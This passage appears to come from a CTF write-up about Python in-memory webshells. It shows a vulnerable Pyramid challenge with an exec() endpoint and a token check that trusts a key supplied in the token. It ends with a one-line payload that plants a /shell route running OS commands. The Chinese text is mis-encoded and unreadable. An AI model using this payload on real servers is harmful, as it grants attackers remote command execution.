</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="s2">&#34;401 Unauthorized&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="s2">&#34;401 Unauthorized&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;Please Input code &amp; token&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">exec</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;Success!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">Configurator</span><span class="p">()</span> <span class="k">as</span> <span class="n">config</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;register_front&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;register_api&#39;</span><span class="p">,</span> <span class="s1">&#39;/api/register&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;system_test&#39;</span><span class="p">,</span> <span class="s1">&#39;/api/test&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;front_test&#39;</span><span class="p">,</span> <span class="s1">&#39;/test&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">system_test</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;system_test&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">front_test</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;front_test&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">register_api</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;register_api&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">register_front</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;register_front&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">app</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">make_wsgi_app</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">server</span> <span class="o">=</span> <span class="n">make_server</span><span class="p">(</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">6543</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>util.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Signature</span> <span class="kn">import</span> <span class="n">pkcs1_15</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">SHA256</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">secret</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_keys</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">private_key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">public_key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">publickey</span><span class="p">()</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">private_key</span><span class="p">,</span> <span class="n">public_key</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sign_data</span><span class="p">(</span><span class="n">private_key</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">rsakey</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å°†JSONæ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">    <span class="n">data_str</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">hash_obj</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">data_str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">signature</span> <span class="o">=</span> <span class="n">pkcs1_15</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">rsakey</span><span class="p">)</span><span class="o">.</span><span class="n">sign</span><span class="p">(</span><span class="n">hash_obj</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">signature</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">verify_signature</span><span class="p">(</span><span class="n">secret</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">signature</span><span class="p">,</span> <span class="n">alg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">alg</span> <span class="o">==</span> <span class="s1">&#39;RS&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">rsakey</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å°†JSONæ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">        <span class="n">data_str</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">hash_obj</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">data_str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pkcs1_15</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">rsakey</span><span class="p">)</span><span class="o">.</span><span class="n">verify</span><span class="p">(</span><span class="n">hash_obj</span><span class="p">,</span> <span class="n">signature</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Signature is valid. Transmitted data:&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="p">(</span><span class="ne">ValueError</span><span class="p">,</span> <span class="ne">TypeError</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Signature is invalid.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">alg</span> <span class="o">==</span> <span class="s1">&#39;HS&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">hash_object</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">data_bytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="n">secret</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">data_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">hash_object</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">data_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">hex_dig</span> <span class="o">=</span> <span class="n">hash_object</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">hex_dig</span> <span class="o">==</span> <span class="n">signature</span><span class="o">.</span><span class="n">decode</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">data_encode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">alg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">alg</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;HS&#39;</span><span class="p">,</span> <span class="s1">&#39;RS&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="s2">&#34;Algorithm must be HS or RS!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">private_key</span><span class="p">,</span> <span class="n">public_key</span> <span class="o">=</span> <span class="n">generate_keys</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">alg</span> <span class="o">==</span> <span class="s1">&#39;RS&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">signature</span> <span class="o">=</span> <span class="n">sign_data</span><span class="p">(</span><span class="n">private_key</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">data_bytes</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data1</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">data_bytes</span><span class="p">)</span>  <span class="c1"># data</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data2</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">signature</span><span class="p">)</span>  <span class="c1"># signature</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">encoded_data2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data3</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">alg</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>  <span class="c1"># alg</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data4</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>  <span class="c1"># public_key</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data</span> <span class="o">=</span> <span class="n">encoded_data1</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">encoded_data2</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">encoded_data3</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">encoded_data4</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;The encoded data is: &#34;</span><span class="p">,</span> <span class="n">encoded_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">encoded_data</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">hash_object</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">data_bytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="n">secret</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">inputdata</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">hash_object</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">data_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">hex_dig</span> <span class="o">=</span> <span class="n">hash_object</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">signature</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">hex_dig</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data1</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">inputdata</span><span class="p">)</span>  <span class="c1"># data</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data3</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">alg</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>  <span class="c1"># alg</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data</span> <span class="o">=</span> <span class="n">encoded_data1</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">signature</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">encoded_data3</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;The encoded data is: &#34;</span><span class="p">,</span> <span class="n">encoded_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">encoded_data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">data_decode</span><span class="p">(</span><span class="n">encode_data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">all_data</span> <span class="o">=</span> <span class="n">encode_data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sig_bytes</span> <span class="o">=</span> <span class="n">all_data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">sig_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">all_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">signature</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">sig_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">alg</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">all_data</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">secret</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">all_data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">key_bytes</span> <span class="o">=</span> <span class="n">all_data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">)</span>  <span class="c1"># bytes</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># éªŒè¯ç­¾å</span>
</span></span><span class="line"><span class="cl">        <span class="n">is_valid</span> <span class="o">=</span> <span class="n">verify_signature</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">json_data</span><span class="p">,</span> <span class="n">signature</span><span class="p">,</span> <span class="n">alg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">is_valid</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">json_data</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="s2">&#34;something error&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_html</span><span class="p">(</span><span class="n">filname</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./static/&#39;</span> <span class="o">+</span> <span class="n">filname</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># è¯»å–æ–‡ä»¶å†…å®¹</span>
</span></span><span class="line"><span class="cl">        <span class="n">html_content</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">html_content</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šé¢ä¸€é¢˜ç”±äºconfigæ˜¯å±€éƒ¨å˜é‡è·å–ä¸äº†ï¼Œè¿™é¢˜å¯ä»¥äº†</p>
<p>ç›´æ¥ä¸Šå†…å­˜é©¬payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="s2">&#34;import sys;config = sys.modules[&#39;__main__&#39;].config;app=sys.modules[&#39;__main__&#39;].app;print(config);config.add_route(&#39;shell&#39;, &#39;/shell&#39;);config.add_view(lambda request: Response(__import__(&#39;os&#39;).popen(request.params.get(&#39;1&#39;)).read()),route_name=&#39;shell&#39;);app = config.make_wsgi_app()&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">å†…å­˜é©¬</a>
        
            <a href="/tags/flask/">Flask</a>
        
            <a href="/tags/tornado/">Tornado</a>
        
            <a href="/tags/django/">Django</a>
        
            <a href="/tags/pyramid/">Pyramid</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under 9u_l3</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/sstiflask/">
        
        
            <div class="article-image">
                <img src="/p/sstiflask/1.18690d4a1682b6ba067ba16c76b02b27.webp" 
                        width="2048" 
                        height="1536" 
                        loading="lazy"
                        alt="Featured image of post SSTI(flask)"
                        
                        data-hash="md5-GGkNShaCtroGe6FsdrArJw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SSTI(flask)</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">
        
        
            <div class="article-image">
                <img src="/p/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.ccbc46cf8a0366a09bdff353407255b7.webp" 
                        width="1792" 
                        height="2560" 
                        loading="lazy"
                        alt="Featured image of post pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"
                        
